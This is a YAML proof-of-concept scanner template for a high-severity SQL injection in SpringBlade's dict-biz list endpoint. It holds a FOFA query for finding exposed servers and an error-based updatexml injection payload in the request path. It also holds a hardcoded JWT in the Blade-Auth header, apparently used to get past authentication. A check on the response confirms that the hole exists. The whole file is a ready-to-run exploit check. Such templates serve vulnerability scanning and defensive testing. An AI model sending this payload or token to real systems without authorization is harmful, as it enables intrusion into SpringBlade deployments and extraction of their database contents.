id: poc-yaml-springblade-dict-biz-sqli
info:
  name: SpringBlade dict-biz SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: springblade
  fofa: body="https://bladex.vip" || body="Saber 将不能正常工作"
variables:
  t1: random_int(1,10000)
  t2: md5(t1)
requests:
- method: GET
  path: /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5({{.t1}}),0x7e),1)=1
  headers:
    Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9..wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
  expression: status_code == 500 && contains(body,"XPATH syntax error") && contains(body,substr(t2,0,31))
    && contains(headers,"application/json")
transport: http
